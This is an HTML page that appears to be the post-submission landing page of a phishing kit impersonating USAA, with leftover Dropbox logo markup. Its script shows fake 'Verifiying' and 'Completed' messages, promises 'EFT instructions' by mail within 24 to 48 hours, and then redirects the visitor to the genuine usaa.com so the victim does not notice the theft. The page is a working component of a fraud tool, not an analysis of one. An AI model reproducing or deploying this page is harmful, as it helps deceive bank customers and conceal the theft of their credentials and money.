<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
      <meta http-equiv="X-UA-Compatible" content="IE=edge">
      <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
      <meta http-equiv="x-ua-compatible" content="ie=edge">
      <link rel="SHORTCUT ICON" sizes="16x16" href="files/img/usaa.png">
<style>
body, html {
  height: 100%;
  font-family: Arial, Helvetica, sans-serif;
}

* {
  box-sizing: border-box;
}

body {
         background-image: url("files/img/bg.png");
         }

/* Add styles to the form container */
.container {
  position: static;
  top: 100px;
  right: 0;
  margin: auto;
  max-width: 300px;
  padding: 15px;
  background-color: white;
}

/* Full-width input fields */
input[type=text], input[type=password] {
  width: 100%;
  padding: 15px;
  margin: 5px 0 22px 0;
  border: none;
  background: #f1f1f1;
}

input[type=text]:focus, input[type=password]:focus {
  background-color: #ddd;
  outline: none;
}

/* Set a style for the submit button */
.btn {
  background-color: green;
  color: white;
  padding: 16px 20px;
  border: none;
  cursor: pointer;
  width: 100%;
  opacity: 0.9;
}

.btn:hover {
  opacity: 1;
}
</style>
</head>

<body><noscript>You need to enable JavaScript to run this app.</noscript>
    </script>
                </video>
                <div class="header">
				<br><br><br><br>
				</div>
                <body>
    		<div style="color:#FF7200;">
				<WMCH err_msg>
					
					<h2 style="text-align:center;" class="dropbox-logo" id="dropbox-logo"><a class="dropbox-logo__link" href="/"><img width="100" alt="" class="dropbox-logo__type" src="data:image/png;base64,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"></a></h2>					
				
				</WMCH>
			</div>
<DIV id=splashcontainer style="text-align:center;"></DIV><LAYER

id=splashcontainerns width="450"></LAYER>

<font face="Arial" size="18">

<SCRIPT>



var preloadimages=new Array(":abstract.simplenet.com/point.gif","abstract.simplenet.com/point2.html")



var intervals=6000

//configure destination URL

var targetdestination="https://www.usaa.com/"





var splashmessage=new Array()

var openingtags='<font face="ARIAL" size="18"style="color:Green">'

splashmessage[0]='Verifiying......!'

splashmessage[1]='Completed '

splashmessage[2]='You will receive your EFT instructions in your mail in the next 24 to 48 hours.'

splashmessage[3]='You will receive your EFT instructions in your mail in the next 24 to 48 hours.'




var closingtags='</font>'



//Do not edit below this line (besides HTML code at the very bottom)



var i=0



var ns4=document.layers?1:0

var ie4=document.all?1:0

var ns6=document.getElementById&&!document.all?1:0

var theimages=new Array()



//preload images

if (document.images){

for (p=0;p<preloadimages.length;p++){

theimages[p]=new Image()

theimages[p].src=preloadimages[p]

}

}



function displaysplash(){

if (i<splashmessage.length){

sc_cross.style.visibility="hidden"

sc_cross.innerHTML='<b><center>'+openingtags+splashmessage[i]+closingtags+'</center></b>'

sc_cross.style.left=ns6?parseInt(window.pageXOffset)+parseInt(window.innerWidth)/2-parseInt(sc_cross.style.width)/2 :document.body.scrollLeft+document.body.clientWidth/2-parseInt(sc_cross.style.width)/2

sc_cross.style.top=ns6?parseInt(window.pageYOffset)+parseInt(window.innerHeight)/2-sc_cross.offsetHeight/2:document.body.scrollTop+document.body.clientHeight/2-sc_cross.offsetHeight/2

sc_cross.style.visibility="visible"

i++

}

else{

window.location=targetdestination

return

}

setTimeout("displaysplash()",intervals)

}



function displaysplash_ns(){

if (i<splashmessage.length){

sc_ns.visibility="hide"

sc_ns.document.write('<b>'+openingtags+splashmessage[i]+closingtags+'</b>')

sc_ns.document.close()



sc_ns.left=pageXOffset+window.innerWidth/2-sc_ns.document.width/2

sc_ns.top=pageYOffset+window.innerHeight/2-sc_ns.document.height/2



sc_ns.visibility="show"

i++

}

else{

window.location=targetdestination

return

}

setTimeout("displaysplash_ns()",intervals)

}







function positionsplashcontainer(){

if (ie4||ns6){

sc_cross=ns6?document.getElementById("splashcontainer"):document.all.splashcontainer

displaysplash()

}

else if (ns4){

sc_ns=document.splashcontainerns

sc_ns.visibility="show"

displaysplash_ns()

}

else

window.location=targetdestination

}

window.onload=positionsplashcontainer



</SCRIPT>



</font>



<DIV align=right> </DIV>

<SCRIPT><!--

 var jv=1.0;

//--></SCRIPT>



<SCRIPT language=Javascript1.1><!--

 jv=1.1;

//--></SCRIPT>



<SCRIPT language=Javascript1.2><!--

 jv=1.2;

//--></SCRIPT>



<SCRIPT language=Javascript1.3><!--

 jv=1.3;

//--></SCRIPT>



<SCRIPT language=Javascript1.4><!--

 jv=1.4;

//--></SCRIPT>  

</body>
</html>
